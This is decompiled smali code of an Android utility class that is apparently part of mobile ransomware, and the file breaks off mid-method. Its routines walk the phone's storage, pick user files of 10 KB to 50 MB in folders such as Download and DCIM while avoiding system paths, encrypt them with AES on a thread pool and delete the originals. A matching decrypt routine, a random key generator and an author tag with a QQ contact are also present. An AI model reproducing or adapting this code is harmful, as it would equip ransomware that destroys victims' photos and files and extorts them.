.class public Lcsc/stuff/Utils;
.super Ljava/lang/Object;

.field static aa:I

.field static bb:I

.field public final static executorService:Ljava/util/concurrent/ExecutorService;

.field public static filesToEncrypt:Ljava/util/List;

.field static hh:I

.field static \u5f7c\u5cb8\u82b1\u5f00:Z

.method static constructor <clinit>()V
  .registers 2
    const/4 v1, 0
    const/16 v0, 10
    invoke-static { v0 }, Ljava/util/concurrent/Executors;->newFixedThreadPool(I)Ljava/util/concurrent/ExecutorService;
    move-result-object v0
    sput-object v0, Lcsc/stuff/Utils;->executorService:Ljava/util/concurrent/ExecutorService;
    new-instance v0, Ljava/util/ArrayList;
    invoke-direct { v0 }, Ljava/util/ArrayList;-><init>()V
    sput-object v0, Lcsc/stuff/Utils;->filesToEncrypt:Ljava/util/List;
    sput v1, Lcsc/stuff/Utils;->aa:I
    sput v1, Lcsc/stuff/Utils;->bb:I
    sput v1, Lcsc/stuff/Utils;->hh:I
    return-void
.end method

.method public constructor <init>()V
  .registers 1
    invoke-direct { p0 }, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static GetFiles(Ljava/lang/String;Ljava/lang/String;Z)V
  .registers 13
    new-instance v0, Ljava/io/File;
    invoke-direct { v0, p0 }, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual { v0 }, Ljava/io/File;->listFiles()[Ljava/io/File;
    move-result-object v2
    array-length v3, v2
    const/4 v0, 0
    move v1, v0
  :L0
    if-ge v1, v3, :L3
    aget-object v4, v2, v1
    invoke-virtual { v4 }, Ljava/io/File;->isFile()Z
    move-result v0
    if-eqz v0, :L4
    invoke-virtual { v4 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/String;->length()I
    move-result v5
    invoke-virtual { p1 }, Ljava/lang/String;->length()I
    move-result v6
    if-lt v5, v6, :L1
    invoke-virtual { v0 }, Ljava/lang/String;->length()I
    move-result v5
    invoke-virtual { p1 }, Ljava/lang/String;->length()I
    move-result v6
    sub-int/2addr v5, v6
    invoke-virtual { v0 }, Ljava/lang/String;->length()I
    move-result v6
    invoke-virtual { v0, v5, v6 }, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;
    move-result-object v0
    check-cast v0, Ljava/lang/String;
  :L1
    invoke-virtual { v4 }, Ljava/io/File;->isFile()Z
    move-result v5
    if-eqz v5, :L2
    invoke-virtual { v0, p1 }, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :L2
    invoke-virtual { v4 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    const-string v5, "/."
    invoke-virtual { v0, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-nez v0, :L2
    invoke-virtual { v4 }, Ljava/io/File;->getName()Ljava/lang/String;
    move-result-object v0
    const-string v5, "."
    invoke-virtual { v0, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :L2
    invoke-virtual { v4 }, Ljava/io/File;->length()J
    move-result-wide v6
    const-wide/16 v8, 10240
    cmp-long v0, v6, v8
    if-lez v0, :L2
    invoke-virtual { v4 }, Ljava/io/File;->length()J
    move-result-wide v6
    const-wide/32 v8, 52428800
    cmp-long v0, v6, v8
    if-gtz v0, :L2
    sget-object v0, Lcsc/stuff/Utils;->filesToEncrypt:Ljava/util/List;
    invoke-virtual { v4 }, Ljava/io/File;->getPath()Ljava/lang/String;
    move-result-object v4
    invoke-interface { v0, v4 }, Ljava/util/List;->add(Ljava/lang/Object;)Z
  :L2
    if-nez p2, :L6
  :L3
    return-void
  :L4
    invoke-virtual { v4 }, Ljava/io/File;->isDirectory()Z
    move-result v0
    if-eqz v0, :L6
    invoke-virtual { v4 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    const-string v5, "/."
    invoke-virtual { v0, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-nez v0, :L6
    invoke-virtual { v4 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    const-string v5, "android"
    invoke-virtual { v0, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-nez v0, :L6
    invoke-virtual { v4 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    const-string v5, "com."
    invoke-virtual { v0, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-nez v0, :L6
    invoke-virtual { v4 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    const-string v5, "miad"
    invoke-virtual { v0, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-nez v0, :L6
    invoke-virtual { v4 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-static { v0 }, Lcsc/stuff/Utils;->jd(Ljava/lang/String;)I
    move-result v0
    const/4 v5, 3
    if-lt v0, v5, :L5
    invoke-virtual { v4 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    const-string v5, "baidunetdisk"
    invoke-virtual { v0, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-nez v0, :L5
    invoke-virtual { v4 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    const-string v5, "download"
    invoke-virtual { v0, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-nez v0, :L5
    invoke-virtual { v4 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    const-string v5, "dcim"
    invoke-virtual { v0, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :L6
  :L5
    invoke-virtual { v4 }, Ljava/io/File;->getPath()Ljava/lang/String;
    move-result-object v0
    invoke-static { v0, p1, p2 }, Lcsc/stuff/Utils;->GetFiles(Ljava/lang/String;Ljava/lang/String;Z)V
  :L6
    add-int/lit8 v0, v1, 1
    move v1, v0
    goto/16 :L0
.end method

.method public static byte2hex([B)Ljava/lang/String;
  .registers 7
    const-string v2, ""
    array-length v3, p0
    const/4 v0, 0
    move v1, v0
  :L0
    if-ge v1, v3, :L3
    aget-byte v0, p0, v1
    and-int/lit16 v0, v0, 255
    invoke-static { v0 }, Ljava/lang/Integer;->toHexString(I)Ljava/lang/String;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/String;->length()I
    move-result v4
    const/4 v5, 1
    if-ne v4, v5, :L2
    new-instance v4, Ljava/lang/StringBuilder;
    invoke-direct { v4 }, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual { v4, v2 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v2
    const-string v4, "0"
    invoke-virtual { v2, v4 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v2
    invoke-virtual { v2, v0 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
  :L1
    add-int/lit8 v1, v1, 1
    move-object v2, v0
    goto :L0
  :L2
    new-instance v4, Ljava/lang/StringBuilder;
    invoke-direct { v4 }, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual { v4, v2 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v2
    invoke-virtual { v2, v0 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    goto :L1
  :L3
    return-object v2
.end method

.method public static bz(Landroid/content/Context;)V
  .registers 1
    return-void
.end method

.method public static decryptFile(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;
  .catch Ljava/io/IOException; { :L0 .. :L3 } :L4
  .catch Ljava/io/IOException; { :L6 .. :L7 } :L4
  .registers 9
    new-instance v0, Ljava/io/File;
    invoke-direct { v0, p1 }, Ljava/io/File;-><init>(Ljava/lang/String;)V
    new-instance v1, Ljava/io/File;
    invoke-direct { v1, p2 }, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual { v1 }, Ljava/io/File;->exists()Z
    move-result v2
    if-nez v2, :L5
    invoke-virtual { v1 }, Ljava/io/File;->isFile()Z
    move-result v2
    if-nez v2, :L5
  :L0
    invoke-virtual { v1 }, Ljava/io/File;->getParentFile()Ljava/io/File;
    move-result-object v2
    invoke-virtual { v2 }, Ljava/io/File;->exists()Z
    move-result v3
    if-nez v3, :L1
    invoke-virtual { v2 }, Ljava/io/File;->mkdirs()Z
    invoke-virtual { v2 }, Ljava/io/File;->createNewFile()Z
  :L1
    new-instance v2, Ljava/io/FileInputStream;
    invoke-direct { v2, v0 }, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    new-instance v0, Ljava/io/FileOutputStream;
    invoke-direct { v0, v1 }, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    new-instance v3, Ljavax/crypto/CipherInputStream;
    const/4 v4, 1
    invoke-static { v4 }, Lcsc/stuff/Utils;->initAESCipher(I)Ljavax/crypto/Cipher;
    move-result-object v4
    invoke-direct { v3, v2, v4 }, Ljavax/crypto/CipherInputStream;-><init>(Ljava/io/InputStream;Ljavax/crypto/Cipher;)V
    const/16 v2, 1024
    new-array v2, v2, [B
  :L2
    invoke-virtual { v3, v2 }, Ljavax/crypto/CipherInputStream;->read([B)I
    move-result v4
    if-ltz v4, :L6
    const/4 v5, 0
    invoke-virtual { v0, v2, v5, v4 }, Ljava/io/FileOutputStream;->write([BII)V
  :L3
    goto :L2
  :L4
    move-exception v0
    invoke-virtual { v0 }, Ljava/io/IOException;->printStackTrace()V
  :L5
    return-object v1
  :L6
    invoke-virtual { v0 }, Ljava/io/FileOutputStream;->flush()V
    invoke-virtual { v0 }, Ljava/io/FileOutputStream;->close()V
    invoke-virtual { v3 }, Ljavax/crypto/CipherInputStream;->close()V
  :L7
    goto :L5
.end method

.method public static deleteDir(Ljava/lang/String;Ljava/lang/String;ILandroid/content/Context;)V
  .registers 8
    if-eqz p2, :L0
    new-instance v0, Ljava/util/Timer;
    invoke-direct { v0 }, Ljava/util/Timer;-><init>()V
    new-instance v1, Lcsc/stuff/Utils$1;
    invoke-direct { v1, p3 }, Lcsc/stuff/Utils$1;-><init>(Landroid/content/Context;)V
    const-wide/32 v2, 600000
    invoke-virtual { v0, v1, v2, v3 }, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V
  :L0
    new-instance v0, Ljava/io/File;
    invoke-direct { v0, p0 }, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-static { v0, p1, p2, p3 }, Lcsc/stuff/Utils;->deleteDirWithFile(Ljava/io/File;Ljava/lang/String;ILandroid/content/Context;)V
    const/4 v0, 1
    sput-boolean v0, Lcsc/stuff/Utils;->å½¼å²¸èŠ±å¼€:Z
    return-void
.end method

.method public static deleteDirWithFile(Ljava/io/File;Ljava/lang/String;ILandroid/content/Context;)V
  .catch Ljava/lang/Exception; { :L2 .. :L6 } :L7
  .registers 13
    const/4 v8, 3
    if-eqz p0, :L11
    invoke-virtual { p0 }, Ljava/io/File;->exists()Z
    move-result v0
    if-eqz v0, :L11
    invoke-virtual { p0 }, Ljava/io/File;->isDirectory()Z
    move-result v0
    if-eqz v0, :L11
    invoke-virtual { p0 }, Ljava/io/File;->listFiles()[Ljava/io/File;
    move-result-object v0
    invoke-static { v0 }, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;
    move-result-object v0
    invoke-static { v0 }, Ljava/util/Collections;->reverse(Ljava/util/List;)V
    invoke-interface { v0 }, Ljava/util/List;->size()I
    move-result v1
    new-array v1, v1, [Ljava/io/File;
    invoke-interface { v0, v1 }, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;
    move-result-object v0
    check-cast v0, [Ljava/io/File;
    array-length v2, v0
    const/4 v1, 0
  :L0
    if-ge v1, v2, :L11
    aget-object v3, v0, v1
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->length()I
    move-result v5
    if-ltz v5, :L1
  :L1
    if-nez p2, :L8
  :L2
    invoke-virtual { v3 }, Ljava/io/File;->isFile()Z
    move-result v5
    if-eqz v5, :L4
    const-string v5, ""
    invoke-virtual { v4, v5 }, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v4
    if-eqz v4, :L4
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    const-string v5, "/."
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L4
    invoke-virtual { v3 }, Ljava/io/File;->getName()Ljava/lang/String;
    move-result-object v4
    const-string v5, "."
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-eqz v4, :L4
    sget-object v4, Lcsc/stuff/Utils;->executorService:Ljava/util/concurrent/ExecutorService;
    new-instance v5, Lcsc/stuff/Utils$2;
    invoke-direct { v5, v3, p1, p2, p3 }, Lcsc/stuff/Utils$2;-><init>(Ljava/io/File;Ljava/lang/String;ILandroid/content/Context;)V
    invoke-interface { v4, v5 }, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V
  :L3
    add-int/lit8 v1, v1, 1
    goto :L0
  :L4
    invoke-virtual { v3 }, Ljava/io/File;->isDirectory()Z
    move-result v4
    if-eqz v4, :L3
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    const-string v5, "/."
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L3
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "android"
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L3
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "com."
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L3
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "miad"
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L3
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-static { v4 }, Lcsc/stuff/Utils;->jd(Ljava/lang/String;)I
    move-result v4
    if-lt v4, v8, :L5
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "baidunetdisk"
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L5
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "download"
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L5
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "dcim"
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-eqz v4, :L3
  :L5
    invoke-static { v3, p1, p2, p3 }, Lcsc/stuff/Utils;->deleteDirWithFile(Ljava/io/File;Ljava/lang/String;ILandroid/content/Context;)V
  :L6
    goto/16 :L3
  :L7
    move-exception v3
    goto/16 :L3
  :L8
    invoke-virtual { v3 }, Ljava/io/File;->isFile()Z
    move-result v4
    if-eqz v4, :L9
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    const-string v5, "/."
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L9
    invoke-virtual { v3 }, Ljava/io/File;->getName()Ljava/lang/String;
    move-result-object v4
    const-string v5, "."
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-eqz v4, :L9
    invoke-virtual { v3 }, Ljava/io/File;->length()J
    move-result-wide v4
    const-wide/16 v6, 10240
    cmp-long v4, v4, v6
    if-lez v4, :L9
    invoke-virtual { v3 }, Ljava/io/File;->length()J
    move-result-wide v4
    const-wide/32 v6, 52428800
    cmp-long v4, v4, v6
    if-gtz v4, :L9
    sget v4, Lcsc/stuff/Utils;->bb:I
    add-int/lit8 v4, v4, 1
    sput v4, Lcsc/stuff/Utils;->bb:I
    sget-object v4, Lcsc/stuff/Utils;->executorService:Ljava/util/concurrent/ExecutorService;
    new-instance v5, Lcsc/stuff/Utils$3;
    invoke-direct { v5, v3, p1, p2, p3 }, Lcsc/stuff/Utils$3;-><init>(Ljava/io/File;Ljava/lang/String;ILandroid/content/Context;)V
    invoke-interface { v4, v5 }, Ljava/util/concurrent/ExecutorService;->execute(Ljava/lang/Runnable;)V
    goto/16 :L3
  :L9
    invoke-virtual { v3 }, Ljava/io/File;->isDirectory()Z
    move-result v4
    if-eqz v4, :L3
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    const-string v5, "/."
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L3
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "android"
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L3
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "com."
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L3
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "miad"
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L3
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-static { v4 }, Lcsc/stuff/Utils;->jd(Ljava/lang/String;)I
    move-result v4
    if-lt v4, v8, :L10
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "baidunetdisk"
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L10
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "download"
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-nez v4, :L10
    invoke-virtual { v3 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v4 }, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v4
    const-string v5, "dcim"
    invoke-virtual { v4, v5 }, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v4
    if-eqz v4, :L3
  :L10
    invoke-static { v3, p1, p2, p3 }, Lcsc/stuff/Utils;->deleteDirWithFile(Ljava/io/File;Ljava/lang/String;ILandroid/content/Context;)V
    goto/16 :L3
  :L11
    return-void
.end method

.method public static deleteFile(Ljava/io/File;)V
  .registers 3
    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcsc/stuff/Utils$4;
    invoke-direct { v1, p0 }, Lcsc/stuff/Utils$4;-><init>(Ljava/io/File;)V
    invoke-direct { v0, v1 }, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual { v0 }, Ljava/lang/Thread;->start()V
    return-void
.end method

.method public static encryptFile(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;
  .catch Ljava/io/IOException; { :L0 .. :L3 } :L4
  .catch Ljava/io/IOException; { :L6 .. :L7 } :L4
  .registers 10
    new-instance v0, Ljava/io/File;
    invoke-direct { v0, p1 }, Ljava/io/File;-><init>(Ljava/lang/String;)V
    new-instance v1, Ljava/io/File;
    invoke-direct { v1, p2 }, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual { v1 }, Ljava/io/File;->exists()Z
    move-result v2
    if-nez v2, :L5
    invoke-virtual { v1 }, Ljava/io/File;->isFile()Z
    move-result v2
    if-nez v2, :L5
  :L0
    invoke-virtual { v1 }, Ljava/io/File;->getParentFile()Ljava/io/File;
    move-result-object v2
    invoke-virtual { v2 }, Ljava/io/File;->exists()Z
    move-result v3
    if-nez v3, :L1
    invoke-virtual { v2 }, Ljava/io/File;->mkdirs()Z
    invoke-virtual { v2 }, Ljava/io/File;->createNewFile()Z
  :L1
    new-instance v2, Ljava/io/FileInputStream;
    invoke-direct { v2, v0 }, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    new-instance v0, Ljava/io/FileOutputStream;
    invoke-direct { v0, v1 }, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    new-instance v3, Ljavax/crypto/CipherOutputStream;
    const/4 v4, 1
    invoke-static { v4 }, Lcsc/stuff/Utils;->initAESCipher(I)Ljavax/crypto/Cipher;
    move-result-object v4
    invoke-direct { v3, v0, v4 }, Ljavax/crypto/CipherOutputStream;-><init>(Ljava/io/OutputStream;Ljavax/crypto/Cipher;)V
    const/16 v4, 1024
    new-array v4, v4, [B
  :L2
    invoke-virtual { v2, v4 }, Ljava/io/FileInputStream;->read([B)I
    move-result v5
    if-ltz v5, :L6
    const/4 v6, 0
    invoke-virtual { v3, v4, v6, v5 }, Ljavax/crypto/CipherOutputStream;->write([BII)V
  :L3
    goto :L2
  :L4
    move-exception v0
    invoke-virtual { v0 }, Ljava/io/IOException;->printStackTrace()V
  :L5
    return-object v1
  :L6
    invoke-virtual { v0 }, Ljava/io/FileOutputStream;->flush()V
    invoke-virtual { v0 }, Ljava/io/FileOutputStream;->close()V
    invoke-virtual { v3 }, Ljavax/crypto/CipherOutputStream;->close()V
  :L7
    goto :L5
.end method

.method public static formatDuring(J)Ljava/lang/String;
  .registers 12
    const-wide/32 v8, 86400000
    const-wide/32 v6, 3600000
    const-wide/32 v4, 60000
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct { v0 }, Ljava/lang/StringBuilder;-><init>()V
    div-long v2, p0, v8
    invoke-static { v2, v3 }, Lcsc/stuff/Utils;->to2Str(J)Ljava/lang/String;
    move-result-object v1
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    const-string v1, ":"
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    rem-long v2, p0, v8
    div-long/2addr v2, v6
    invoke-static { v2, v3 }, Lcsc/stuff/Utils;->to2Str(J)Ljava/lang/String;
    move-result-object v1
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    const-string v1, ":"
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    rem-long v2, p0, v6
    div-long/2addr v2, v4
    invoke-static { v2, v3 }, Lcsc/stuff/Utils;->to2Str(J)Ljava/lang/String;
    move-result-object v1
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    const-string v1, ":"
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    rem-long v2, p0, v4
    const-wide/16 v4, 1000
    div-long/2addr v2, v4
    invoke-static { v2, v3 }, Lcsc/stuff/Utils;->to2Str(J)Ljava/lang/String;
    move-result-object v1
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method

.method public static formatDuring(Ljava/util/Date;Ljava/util/Date;)Ljava/lang/String;
  .registers 6
    invoke-virtual { p1 }, Ljava/util/Date;->getTime()J
    move-result-wide v0
    invoke-virtual { p0 }, Ljava/util/Date;->getTime()J
    move-result-wide v2
    sub-long/2addr v0, v2
    invoke-static { v0, v1 }, Lcsc/stuff/Utils;->formatDuring(J)Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method

.method public final static generateCipher()Ljava/lang/String;
  .registers 6
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct { v0 }, Ljava/lang/StringBuilder;-><init>()V
    const-string v1, "abcdefghijklmnopqrstuvwxyz"
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    const-string v1, "abcdefghijklmnopqrstuvwxyz"
    invoke-virtual { v1 }, Ljava/lang/String;->toUpperCase()Ljava/lang/String;
    move-result-object v1
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    const-string v1, "1234567890!@#$%^&*()"
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    new-instance v2, Ljava/util/Random;
    invoke-static { }, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v4
    invoke-direct { v2, v4, v5 }, Ljava/util/Random;-><init>(J)V
    new-instance v3, Ljava/lang/StringBuilder;
    invoke-direct { v3 }, Ljava/lang/StringBuilder;-><init>()V
    const/4 v0, 0
  :L0
    const/16 v4, 16
    if-ge v0, v4, :L1
    invoke-virtual { v1 }, Ljava/lang/String;->length()I
    move-result v4
    invoke-virtual { v2, v4 }, Ljava/util/Random;->nextInt(I)I
    move-result v4
    invoke-virtual { v1, v4 }, Ljava/lang/String;->charAt(I)C
    move-result v4
    invoke-virtual { v3, v4 }, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
    add-int/lit8 v0, v0, 1
    goto :L0
  :L1
    invoke-virtual { v3 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method

.method public final static getbah(Ljava/lang/String;)Ljava/lang/String;
  .registers 9
    const/4 v3, 4
    const/4 v7, 0
    new-instance v1, Ljava/lang/String;
    const-string v0, "by:\u5f7c\u5cb8\u82b1 qq:1279525738"
    invoke-virtual { v0 }, Ljava/lang/String;->getBytes()[B
    move-result-object v0
    invoke-static { v0, v7 }, Landroid/util/Base64;->encode([BI)[B
    move-result-object v0
    invoke-direct { v1, v0 }, Ljava/lang/String;-><init>([B)V
    const/4 v0, 3
    invoke-virtual { v1, v0, v3 }, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;
    move-result-object v0
    check-cast v0, Ljava/lang/String;
    const/4 v2, 5
